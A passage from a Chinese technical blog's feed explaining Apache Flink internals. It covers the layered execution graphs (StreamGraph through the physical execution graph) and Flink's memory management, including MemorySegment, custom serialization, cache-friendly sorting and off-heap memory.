class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// split up the lines in pairs (2-tuples) containing: (word,1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      text.flatMap(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Tokenizer())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;comment&quot;&gt;// group by the tuple field &quot;0&quot; and sum up tuple field &quot;1&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          .keyBy(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          .sum(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  counts.print();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// execute program&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  env.execute(&lt;span class=&quot;string&quot;&gt;&quot;WordCount from SocketTextStream Example&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们将最后一行代码 &lt;code&gt;env.execute&lt;/code&gt; 替换成 &lt;code&gt;System.out.println(env.getExecutionPlan());&lt;/code&gt; 并在本地运行该代码（并发度设为2），可以得到该拓扑的逻辑执行计划图的 JSON 串，将该 JSON 串粘贴到 &lt;a href=&quot;http://flink.apache.org/visualizer/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://flink.apache.org/visualizer/&lt;/a&gt; 中，能可视化该执行图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1vB1uJFXXXXbaXpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;但这并不是最终在 Flink 中运行的执行图，只是一个表示拓扑节点关系的计划图，在 Flink 中对应了 SteramGraph。另外，提交拓扑后（并发度设为2）还能在 UI 中看到另一张执行计划图，如下所示，该图对应了 Flink 中的 JobGraph。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1QKR2JFXXXXbyaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Graph&quot;&gt;&lt;a href=&quot;#Graph&quot; class=&quot;headerlink&quot; title=&quot;Graph&quot;&gt;&lt;/a&gt;Graph&lt;/h2&gt;&lt;p&gt;看起来有点乱，怎么有这么多不一样的图。实际上，还有更多的图。Flink 中的执行图可以分成四层：StreamGraph -&amp;gt; JobGraph -&amp;gt; ExecutionGraph -&amp;gt; 物理执行图。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;StreamGraph：&lt;/strong&gt;是根据用户通过 Stream API 编写的代码生成的最初的图。用来表示程序的拓扑结构。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JobGraph：&lt;/strong&gt;StreamGraph经过优化后生成了 JobGraph，提交给 JobManager 的数据结构。主要的优化为，将多个符合条件的节点 chain 在一起作为一个节点，这样可以减少数据在节点之间流动所需要的序列化/反序列化/传输消耗。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ExecutionGraph：&lt;/strong&gt;JobManager 根据 JobGraph 生成ExecutionGraph。ExecutionGraph是JobGraph的并行化版本，是调度层最核心的数据结构。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;物理执行图：&lt;/strong&gt;JobManager 根据 ExecutionGraph 对 Job 进行调度后，在各个TaskManager 上部署 Task 后形成的“图”，并不是一个具体的数据结构。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如上文中的2个并发度（Source为1个并发度）的 &lt;code&gt;SocketTextStreamWordCount&lt;/code&gt; 四层执行图的演变过程如下图所示（点击查看大图）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1tA_GJFXXXXapXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里对一些名词进行简单的解释。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;StreamGraph：&lt;/strong&gt;根据用户通过 Stream API 编写的代码生成的最初的图。 &lt;ul&gt;
&lt;li&gt;StreamNode：用来代表 operator 的类，并具有所有相关的属性，如并发度、入边和出边等。&lt;/li&gt;
&lt;li&gt;StreamEdge：表示连接两个StreamNode的边。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JobGraph：&lt;/strong&gt;StreamGraph经过优化后生成了 JobGraph，提交给 JobManager 的数据结构。&lt;ul&gt;
&lt;li&gt;JobVertex：经过优化后符合条件的多个StreamNode可能会chain在一起生成一个JobVertex，即一个JobVertex包含一个或多个operator，JobVertex的输入是JobEdge，输出是IntermediateDataSet。&lt;/li&gt;
&lt;li&gt;IntermediateDataSet：表示JobVertex的输出，即经过operator处理产生的数据集。producer是JobVertex，consumer是JobEdge。&lt;/li&gt;
&lt;li&gt;JobEdge：代表了job graph中的一条数据传输通道。source 是 IntermediateDataSet，target 是 JobVertex。即数据通过JobEdge由IntermediateDataSet传递给目标JobVertex。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ExecutionGraph：&lt;/strong&gt;JobManager 根据 JobGraph 生成ExecutionGraph。ExecutionGraph是JobGraph的并行化版本，是调度层最核心的数据结构。&lt;ul&gt;
&lt;li&gt;ExecutionJobVertex：和JobGraph中的JobVertex一一对应。每一个ExecutionJobVertex都有和并发度一样多的 ExecutionVertex。&lt;/li&gt;
&lt;li&gt;ExecutionVertex：表示ExecutionJobVertex的其中一个并发子任务，输入是ExecutionEdge，输出是IntermediateResultPartition。&lt;/li&gt;
&lt;li&gt;IntermediateResult：和JobGraph中的IntermediateDataSet一一对应。每一个IntermediateResult有与下游ExecutionJobVertex相同并发数的IntermediateResultPartition。&lt;/li&gt;
&lt;li&gt;IntermediateResultPartition：表示ExecutionVertex的一个输出分区，producer是ExecutionVertex，consumer是若干个ExecutionEdge。&lt;/li&gt;
&lt;li&gt;ExecutionEdge：表示ExecutionVertex的输入，source是IntermediateResultPartition，target是ExecutionVertex。source和target都只能是一个。&lt;/li&gt;
&lt;li&gt;Execution：是执行一个 ExecutionVertex 的一次尝试。当发生故障或者数据需要重算的情况下 ExecutionVertex 可能会有多个 ExecutionAttemptID。一个 Execution 通过 ExecutionAttemptID 来唯一标识。JM和TM之间关于 task 的部署和 task status 的更新都是通过 ExecutionAttemptID 来确定消息接受者。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;物理执行图：&lt;/strong&gt;JobManager 根据 ExecutionGraph 对 Job 进行调度后，在各个TaskManager 上部署 Task 后形成的“图”，并不是一个具体的数据结构。&lt;ul&gt;
&lt;li&gt;Task：Execution被调度后在分配的 TaskManager 中启动对应的 Task。Task 包裹了具有用户执行逻辑的 operator。&lt;/li&gt;
&lt;li&gt;ResultPartition：代表由一个Task的生成的数据，和ExecutionGraph中的IntermediateResultPartition一一对应。&lt;/li&gt;
&lt;li&gt;ResultSubpartition：是ResultPartition的一个子分区。每个ResultPartition包含多个ResultSubpartition，其数目要由下游消费 Task 数和 DistributionPattern 来决定。&lt;/li&gt;
&lt;li&gt;InputGate：代表Task的输入封装，和JobGraph中JobEdge一一对应。每个InputGate消费了一个或多个的ResultPartition。&lt;/li&gt;
&lt;li&gt;InputChannel：每个InputGate会包含一个以上的InputChannel，和ExecutionGraph中的ExecutionEdge一一对应，也和ResultSubpartition一对一地相连，即一个InputChannel接收一个ResultSubpartition的输出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么 Flink 为什么要设计这4张图呢，其目的是什么呢？Spark 中也有多张图，数据依赖图以及物理执行的DAG。其目的都是一样的，就是解耦，每张图各司其职，每张图对应了 Job 不同的阶段，更方便做该阶段的事情。我们给出更完整的 Flink Graph 的层次图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1qmtpJVXXXXagXXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先我们看到，JobGraph 之上除了 StreamGraph 还有 OptimizedPlan。OptimizedPlan 是由 Batch API 转换而来的。StreamGraph 是由 Stream API 转换而来的。为什么 API 不直接转换成 JobGraph？因为，Batch 和 Stream 的图结构和优化方法有很大的区别，比如 Batch 有很多执行前的预分析用来优化图的执行，而这种优化并不普适于 Stream，所以通过 OptimizedPlan 来做 Batch 的优化会更方便和清晰，也不会影响 Stream。JobGraph 的责任就是统一 Batch 和 Stream 的图，用来描述清楚一个拓扑图的结构，并且做了 chaining 的优化，chaining 是普适于 Batch 和 Stream 的，所以在这一层做掉。ExecutionGraph 的责任是方便调度和各个 tasks 状态的监控和跟踪，所以 ExecutionGraph 是并行化的 JobGraph。而“物理执行图”就是最终分布式在各个机器上运行着的tasks了。所以可以看到，这种解耦方式极大地方便了我们在各个层所做的工作，各个层之间是相互隔离的。&lt;/p&gt;
&lt;p&gt;后续的文章，将会详细介绍 Flink 是如何生成这些执行图的。由于我目前关注 Flink 的流处理功能，所以主要有以下内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://wuchong.me/blog/2016/05/04/flink-internal-how-to-build-streamgraph/&quot;&gt;如何生成 StreamGraph&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://wuchong.me/blog/2016/05/10/flink-internals-how-to-build-jobgraph/&quot;&gt;如何生成 JobGraph&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;如何生成 ExecutionGraph&lt;/li&gt;
&lt;li&gt;如何进行调度（如何生成物理执行图）&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;架构&quot;&gt;&lt;a href=&quot;#架构&quot; class=&quot;headerlink&quot; title=&quot;架构&quot;&gt;&lt;/a&gt;架构&lt;/h2&gt;&lt;p&gt;要了解一个系统，一般都是从架构开始。我们关心的问题是：系统部署成功后各个节点都启动了哪些服务，各个服务之间又是怎么交互和协调的。下方是 Flink 集群启动后架构图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1ObBnJFXXXXXtXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当 Flink 集群启动后，首先会启动一个 JobManger 和一个或多个的 TaskManager。由 Client 提交任务给 JobManager，JobManager 再调度任务到各个 TaskManager 去执行，然后 TaskManager 将心跳和统计信息汇报给 JobManager。TaskManager 之间以流的形式进行数据的传输。上述三者均为独立的 JVM 进程。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：内存管理</title>
    <link href="http://wuchong.me/blog/2016/04/29/flink-internals-memory-manage/"/>
    <id>http://wuchong.me/blog/2016/04/29/flink-internals-memory-manage/</id>
    <published>2016-04-29T06:44:51.000Z</published>
    <updated>2016-04-29T07:34:03.000Z</updated>
    
    <content type="html">&lt;p&gt;如今，大数据领域的开源框架（Hadoop，Spark，Storm）都使用的 JVM，当然也包括 Flink。基于 JVM 的数据分析引擎都需要面对将大量数据存到内存中，这就不得不面对 JVM 存在的几个问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Java 对象存储密度低。一个只包含 boolean 属性的对象占用了16个字节内存：对象头占了8个，boolean 属性占了1个，对齐填充占了7个。而实际上只需要一个bit（1/8字节）就够了。&lt;/li&gt;
&lt;li&gt;Full GC 会极大地影响性能，尤其是为了处理更大数据而开了很大内存空间的JVM来说，GC 会达到秒级甚至分钟级。&lt;/li&gt;
&lt;li&gt;OOM 问题影响稳定性。OutOfMemoryError是分布式计算框架经常会遇到的问题，当JVM中所有对象大小超过分配给JVM的内存大小时，就会发生OutOfMemoryError错误，导致JVM崩溃，分布式框架的健壮性和性能都会受到影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以目前，越来越多的大数据项目开始自己管理JVM内存了，像 Spark、Flink、HBase，为的就是获得像 C 一样的性能以及避免 OOM 的发生。本文将会讨论 Flink 是如何解决上面的问题的，主要内容包括内存管理、定制的序列化工具、缓存友好的数据结构和算法、堆外内存、JIT编译优化等。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;积极的内存管理&quot;&gt;&lt;a href=&quot;#积极的内存管理&quot; class=&quot;headerlink&quot; title=&quot;积极的内存管理&quot;&gt;&lt;/a&gt;积极的内存管理&lt;/h2&gt;&lt;p&gt;Flink 并不是将大量对象存在堆上，而是将对象都序列化到一个预分配的内存块上，这个内存块叫做 &lt;code&gt;MemorySegment&lt;/code&gt;，它代表了一段固定长度的内存（默认大小为 32KB），也是 Flink 中最小的内存分配单元，并且提供了非常高效的读写方法。你可以把 MemorySegment 想象成是为 Flink 定制的 &lt;code&gt;java.nio.ByteBuffer&lt;/code&gt;。它的底层可以是一个普通的 Java 字节数组（&lt;code&gt;byte[]&lt;/code&gt;），也可以是一个申请在堆外的 &lt;code&gt;ByteBuffer&lt;/code&gt;。每条记录都会以序列化的形式存储在一个或多个&lt;code&gt;MemorySegment&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;Flink 中的 Worker 名叫 TaskManager，是用来运行用户代码的 JVM 进程。TaskManager 的堆内存主要被分成了三个部分：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB17qs5JpXXXXXhXpXXXXXXXXXX&quot; width=&quot;300px&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Network Buffers:&lt;/strong&gt; 一定数量的32KB大小的 buffer，主要用于数据的网络传输。在 TaskManager 启动的时候就会分配。默认数量是 2048 个，可以通过 &lt;code&gt;taskmanager.network.numberOfBuffers&lt;/code&gt; 来配置。（阅读&lt;a href=&quot;http://wuchong.me/blog/2016/04/26/flink-internals-how-to-handle-backpressure/#网络传输中的内存管理&quot;&gt;这篇文章&lt;/a&gt;了解更多Network Buffer的管理）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Memory Manager Pool:&lt;/strong&gt; 这是一个由 &lt;code&gt;MemoryManager&lt;/code&gt; 管理的，由众多&lt;code&gt;MemorySegment&lt;/code&gt;组成的超大集合。Flink 中的算法（如 sort/shuffle/join）会向这个内存池申请 MemorySegment，将序列化后的数据存于其中，使用完后释放回内存池。默认情况下，池子占了堆内存的 70% 的大小。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Remaining (Free) Heap:&lt;/strong&gt; 这部分的内存是留给用户代码以及 TaskManager 的数据结构使用的。因为这些数据结构一般都很小，所以基本上这些内存都是给用户代码使用的。从GC的角度来看，可以把这里看成的新生代，也就是说这里主要都是由用户代码生成的短期对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;注意：Memory Manager Pool 主要在Batch模式下使用。在Steaming模式下，该池子不会预分配内存，也不会向该池子请求内存块。也就是说该部分的内存都是可以给用户代码使用的。不过社区是打算在 Streaming 模式下也能将该池子利用起来。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Flink 采用类似 DBMS 的 sort 和 join 算法，直接操作二进制数据，从而使序列化/反序列化带来的开销达到最小。所以 Flink 的内部实现更像 C/C++ 而非 Java。如果需要处理的数据超出了内存限制，则会将部分数据存储到硬盘上。如果要操作多块MemorySegment就像操作一块大的连续内存一样，Flink会使用逻辑视图（&lt;code&gt;AbstractPagedInputView&lt;/code&gt;）来方便操作。下图描述了 Flink 如何存储序列化后的数据到内存块中，以及在需要的时候如何将数据存储到磁盘上。&lt;/p&gt;
&lt;p&gt;从上面我们能够得出 Flink 积极的内存管理以及直接操作二进制数据有以下几点好处：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;减少GC压力。&lt;/strong&gt;显而易见，因为所有常驻型数据都以二进制的形式存在 Flink 的&lt;code&gt;MemoryManager&lt;/code&gt;中，这些&lt;code&gt;MemorySegment&lt;/code&gt;一直呆在老年代而不会被GC回收。其他的数据对象基本上是由用户代码生成的短生命周期对象，这部分对象可以被 Minor GC 快速回收。只要用户不去创建大量类似缓存的常驻型对象，那么老年代的大小是不会变的，Major GC也就永远不会发生。从而有效地降低了垃圾回收的压力。另外，这里的内存块还可以是堆外内存，这可以使得 JVM 内存更小，从而加速垃圾回收。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;避免了OOM。&lt;/strong&gt;所有的运行时数据结构和算法只能通过内存池申请内存，保证了其使用的内存大小是固定的，不会因为运行时数据结构和算法而发生OOM。在内存吃紧的情况下，算法（sort/join等）会高效地将一大批内存块写到磁盘，之后再读回来。因此，&lt;code&gt;OutOfMemoryErrors&lt;/code&gt;可以有效地被避免。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;节省内存空间。&lt;/strong&gt;Java 对象在存储上有很多额外的消耗（如上一节所谈）。如果只存储实际数据的二进制内容，就可以避免这部分消耗。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高效的二进制操作 &amp;amp; 缓存友好的计算。&lt;/strong&gt;二进制数据以定义好的格式存储，可以高效地比较与操作。另外，该二进制形式可以把相关的值，以及hash值，键值和指针等相邻地放进内存中。这使得数据结构可以对高速缓存更友好，可以从 L1/L2/L3 缓存获得性能的提升（下文会详细解释）。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;为-Flink-量身定制的序列化框架&quot;&gt;&lt;a href=&quot;#为-Flink-量身定制的序列化框架&quot; class=&quot;headerlink&quot; title=&quot;为 Flink 量身定制的序列化框架&quot;&gt;&lt;/a&gt;为 Flink 量身定制的序列化框架&lt;/h2&gt;&lt;p&gt;目前 Java 生态圈提供了众多的序列化框架：Java serialization, Kryo, Apache Avro 等等。但是 Flink 实现了自己的序列化框架。因为在 Flink 中处理的数据流通常是同一类型，由于数据集对象的类型固定，对于数据集可以只保存一份对象Schema信息，节省大量的存储空间。同时，对于固定大小的类型，也可通过固定的偏移位置存取。当我们需要访问某个对象成员变量的时候，通过定制的序列化工具，并不需要反序列化整个Java对象，而是可以直接通过偏移量，只是反序列化特定的对象成员变量。如果对象的成员变量较多时，能够大大减少Java对象的创建开销，以及内存数据的拷贝大小。&lt;/p&gt;
&lt;p&gt;Flink支持任意的Java或是Scala类型。Flink 在数据类型上有很大的进步，不需要实现一个特定的接口（像Hadoop中的&lt;code&gt;org.apache.hadoop.io.Writable&lt;/code&gt;），Flink 能够自动识别数据类型。Flink 通过 Java Reflection 框架分析基于 Java 的 Flink 程序 UDF (User Define Function)的返回类型的类型信息，通过 Scala Compiler 分析基于 Scala 的 Flink 程序 UDF 的返回类型的类型信息。类型信息由 &lt;code&gt;TypeInformation&lt;/code&gt; 类表示，TypeInformation 支持以下几种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;BasicTypeInfo&lt;/code&gt;: 任意Java 基本类型（装箱的）或 String 类型。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BasicArrayTypeInfo&lt;/code&gt;: 任意Java基本类型数组（装箱的）或 String 数组。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WritableTypeInfo&lt;/code&gt;: 任意 Hadoop Writable 接口的实现类。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TupleTypeInfo&lt;/code&gt;: 任意的 Flink Tuple 类型(支持Tuple1 to Tuple25)。Flink tuples 是固定长度固定类型的Java Tuple实现。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CaseClassTypeInfo&lt;/code&gt;: 任意的 Scala CaseClass(包括 Scala tuples)。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PojoTypeInfo&lt;/code&gt;: 任意的 POJO (Java or Scala)，例如，Java对象的所有成员变量，要么是 public 修饰符定义，要么有 getter/setter 方法。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GenericTypeInfo&lt;/code&gt;: 任意无法匹配之前几种类型的类。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前六种数据类型基本上可以满足绝大部分的Flink程序，针对前六种类型数据集，Flink皆可以自动生成对应的TypeSerializer，能非常高效地对数据集进行序列化和反序列化。对于最后一种数据类型，Flink会使用Kryo进行序列化和反序列化。每个TypeInformation中，都包含了serializer，类型会自动通过serializer进行序列化，然后用Java Unsafe接口写入MemorySegments。对于可以用作key的数据类型，Flink还同时自动生成TypeComparator，用来辅助直接对序列化后的二进制数据进行compare、hash等操作。对于 Tuple、CaseClass、POJO 等组合类型，其TypeSerializer和TypeComparator也是组合的，序列化和比较时会委托给对应的serializers和comparators。如下图展示 一个内嵌型的Tuple3&lt;integer,double,person&gt; 对象的序列化过程。&lt;/integer,double,person&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1lvdbJFXXXXa9XVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看出这种序列化方式存储密度是相当紧凑的。其中 int 占4字节，double 占8字节，POJO多个一个字节的header，PojoSerializer只负责将header序列化进去，并委托每个字段对应的serializer对字段进行序列化。&lt;/p&gt;
&lt;p&gt;Flink 的类型系统可以很轻松地扩展出自定义的TypeInformation、Serializer以及Comparator，来提升数据类型在序列化和比较时的性能。&lt;/p&gt;
&lt;h2 id=&quot;Flink-如何直接操作二进制数据&quot;&gt;&lt;a href=&quot;#Flink-如何直接操作二进制数据&quot; class=&quot;headerlink&quot; title=&quot;Flink 如何直接操作二进制数据&quot;&gt;&lt;/a&gt;Flink 如何直接操作二进制数据&lt;/h2&gt;&lt;p&gt;Flink 提供了如 group、sort、join 等操作，这些操作都需要访问海量数据。这里，我们以sort为例，这是一个在 Flink 中使用非常频繁的操作。&lt;/p&gt;
&lt;p&gt;首先，Flink 会从 MemoryManager 中申请一批 MemorySegment，我们把这批 MemorySegment 称作 sort buffer，用来存放排序的数据。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1_hhgJFXXXXc2XFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们会把 sort buffer 分成两块区域。一个区域是用来存放所有对象完整的二进制数据。另一个区域用来存放指向完整二进制数据的指针以及定长的序列化后的key（key+pointer）。如果需要序列化的key是个变长类型，如String，则会取其前缀序列化。如上图所示，当一个对象要加到 sort buffer 中时，它的二进制数据会被加到第一个区域，指针（可能还有key）会被加到第二个区域。&lt;/p&gt;
&lt;p&gt;将实际的数据和指针加定长key分开存放有两个目的。第一，交换定长块（key+pointer）更高效，不用交换真实的数据也不用移动其他key和pointer。第二，这样做是缓存友好的，因为key都是连续存储在内存中的，可以大大减少 cache miss（后面会详细解释）。&lt;/p&gt;
&lt;p&gt;排序的关键是比大小和交换。Flink 中，会先用 key 比大小，这样就可以直接用二进制的key比较而不需要反序列化出整个对象。因为key是定长的，所以如果key相同（或者没有提供二进制key），那就必须将真实的二进制数据反序列化出来，然后再做比较。之后，只需要交换key+pointer就可以达到排序的效果，真实的数据不用移动。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1f6BnJFXXXXbnXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;最后，访问排序后的数据，可以沿着排好序的key+pointer区域顺序访问，通过pointer找到对应的真实数据，并写到内存或外部（更多细节可以看这篇文章 &lt;a href=&quot;http://flink.apache.org/news/2015/03/13/peeking-into-Apache-Flinks-Engine-Room.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Joins in Flink&lt;/a&gt;）。&lt;/p&gt;
&lt;h2 id=&quot;缓存友好的数据结构和算法&quot;&gt;&lt;a href=&quot;#缓存友好的数据结构和算法&quot; class=&quot;headerlink&quot; title=&quot;缓存友好的数据结构和算法&quot;&gt;&lt;/a&gt;缓存友好的数据结构和算法&lt;/h2&gt;&lt;p&gt;随着磁盘IO和网络IO越来越快，CPU逐渐成为了大数据领域的瓶颈。从 L1/L2/L3 缓存读取数据的速度比从主内存读取数据的速度快好几个量级。通过性能分析可以发现，CPU时间中的很大一部分都是浪费在等待数据从主内存过来上。如果这些数据可以从 L1/L2/L3 缓存过来，那么这些等待时间可以极大地降低，并且所有的算法会因此而受益。&lt;/p&gt;
&lt;p&gt;在上面讨论中我们谈到的，Flink 通过定制的序列化框架将算法中需要操作的数据（如sort中的key）连续存储，而完整数据存储在其他地方。因为对于完整的数据来说，key+pointer更容易装进缓存，这大大提高了缓存命中率，从而提高了基础算法的效率。这对于上层应用是完全透明的，可以充分享受缓存友好带来的性能提升。&lt;/p&gt;
&lt;h2 id=&quot;走向堆外内存&quot;&gt;&lt;a href=&quot;#走向堆外内存&quot; class=&quot;headerlink&quot; title=&quot;走向堆外内存&quot;&gt;&lt;/a&gt;走向堆外内存&lt;/h2&gt;&lt;p&gt;Flink 基于堆内存的内存管理机制已经可以解决很多JVM现存问题了，为什么还要引入堆外内存？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;启动超大内存（上百GB）的JVM需要很长时间，GC停留时间也会很长（分钟级）。使用堆外内存的话，可以极大地减小堆内存（只需要分配Remaining Heap那一块），使得 TaskManager 扩展到上百GB内存不是问题。&lt;/li&gt;
&lt;li&gt;高效的 IO 操作。堆外内存在写磁盘或网络传输时是 zero-copy，而堆内存的话，至少需要 copy 一次。&lt;/li&gt;
&lt;li&gt;堆外内存是进程间共享的。也就是说，即使JVM进程崩溃也不会丢失数据。这可以用来做故障恢复（Flink暂时没有利用起这个，不过未来很可能会去做）。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是强大的东西总是会有其负面的一面，不然为何大家不都用堆外内存呢。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;堆内存的使用、监控、调试都要简单很多。堆外内存意味着更复杂更麻烦。&lt;/li&gt;
&lt;li&gt;Flink 有时需要分配短生命周期的 &lt;code&gt;MemorySegment&lt;/code&gt;，这个申请在堆上会更廉价。&lt;/li&gt;
&lt;li&gt;有些操作在堆内存上会快一点点。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Flink用通过&lt;code&gt;ByteBuffer.allocateDirect(numBytes)&lt;/code&gt;来申请堆外内存，用 &lt;code&gt;sun.misc.Unsafe&lt;/code&gt; 来操作堆外内存。&lt;/p&gt;
&lt;p&gt;基于 Flink 优秀的设计，实现堆外内存是很方便的。Flink 将原来的 &lt;code&gt;MemorySegment&lt;/code&gt; 变成了抽象类，并生成了两个子类。&lt;code&gt;HeapMemorySegment&lt;/code&gt; 和 &lt;code&gt;HybridMemorySegment&lt;/code&gt;。从字面意思上也很容易理解，前者是用来分配堆内存的，后者是用来分配堆外内存&lt;strong&gt;和堆内存&lt;/strong&gt;的。是的，你没有看错，后者既可以分配堆外内存又可以分配堆内存。为什么要这样设计呢？&lt;/p&gt;
&lt;p&gt;首先假设&lt;code&gt;HybridMemorySegment&lt;/code&gt;只提供分配堆外内存。在上述堆外内存的不足中的第二点谈到，Flink 有时需要分配短生命周期的 buffer，这些buffer用&lt;code&gt;HeapMemorySegment&lt;/code&gt;会更高效。那么当使用堆外内存时，为了也满足堆内存的需求，我们需要同时加载两个子类。这就涉及到了 JIT 编译优化的问题。因为以前 &lt;code&gt;MemorySegment&lt;/code&gt; 是一个单独的 final 类，没有子类。JIT 编译时，所有要调用的方法都是确定的，所有的方法调用都可以被去虚化（de-virtualized）和内联（inlined），这可以极大地提高性能（MemroySegment的使用相当频繁）。然而如果同时加载两个子类，那么 JIT 编译器就只能在真正运行到的时候才知道是哪个子类，这样就无法提前做优化。实际测试的性能差距在 2.7 被左右。&lt;/p&gt;
&lt;p&gt;Flink 使用了两种方案：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方案1：只能有一种 MemorySegment 实现被加载&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;代码中所有的短生命周期和长生命周期的MemorySegment都实例化其中一个子类，另一个子类根本没有实例化过（使用工厂模式来控制）。那么运行一段时间后，JIT 会意识到所有调用的方法都是确定的，然后会做优化。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方案2：提供一种实现能同时处理堆内存和堆外内存&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这就是 &lt;code&gt;HybridMemorySegment&lt;/code&gt; 了，能同时处理堆与堆外内存，这样就不需要子类了。这里 Flink 优雅地实现了一份代码能同时操作堆和堆外内存。这主要归功于 &lt;code&gt;sun.misc.Unsafe&lt;/code&gt;提供的一系列方法，如getLong方法：&lt;/p&gt;
